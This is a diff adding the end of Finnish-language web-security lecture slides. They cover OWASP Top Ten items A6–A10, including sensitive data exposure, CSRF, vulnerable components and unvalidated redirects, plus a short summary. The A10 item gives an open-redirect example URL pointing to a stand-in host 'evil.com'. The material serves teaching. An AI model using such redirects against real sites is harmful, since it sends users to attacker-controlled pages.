+</li>
+<li><p>A6: Sensitive Data Exposure</p>
+<ul>
+<li>Sensitiivisen datan paljastuminen</li>
+<li>Estäminen:<ul>
+<li>Älä säilö sensitiivistä dataa turhaan, esim. logeissa</li>
+<li>Salakirjoita sensitiivinen data</li>
+<li>Käytä hyväksihavaittuja salakirjoitusteknologioita</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="owasp-top-ten-a7-a10-">OWASP Top Ten (A7-A10)</h2>
+<ul>
+<li><p>A7: Missing Function Level Access Control</p>
+<ul>
+<li>Samoin kuin datan (A4), täytyy toimintojenkin autentikointi olla
+kunnossa</li>
+</ul>
+</li>
+<li><p>A8: Cross-Site Request Forgery (CSRF)</p>
+</li>
+<li><p>A9: Using Components with Known Vulnerabilities</p>
+<ul>
+<li>Käytetään komponenttia jossa on tunnettu haavoittuvuus</li>
+<li>Estäminen: web-palvelimen ylläpitäjän pitää seurata uutisia
+käytetyistä komponenteista löytyvistä tietoturvaongelmista ja
+asentaa korjaukset nopeasti<ul>
+<li>tai luopua haavoittuvaisen komponentin käytöstä</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>A10: Unvalidated Redirects and Forwards</p>
+<ul>
+<li>Tarkistamattomat uudelleenohjaukset</li>
+<li>Esim. <code>http://example.com/redirect.jsp?url=evil.com</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="owasp-top-ten">OWASP Top Ten</h2>
+<p><img src="../img/owasptop10.png" alt=""></p>
+<hr>
+<h2 id="yhteenveto">Yhteenveto</h2>
+<ul>
+<li><p>Käytiin läpi muutama tietoturvaongelma</p>
+<ul>
+<li>Injektiot (ml. XSS)</li>
+<li>CSRF</li>
+<li>Clickjacking</li>
+<li>ym.</li>
+</ul>
+</li>
+<li><p>Nämä eivät kuitenkaan kata kuin pienen osan mahdollisista
+tietoturvaongelmista</p>
+<ul>
+<li>Erilaisia mahdollisia tietoturva-aukkoja on ~rajattomasti</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </div>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/scripts.js"></script>
+	</body>
+</html>
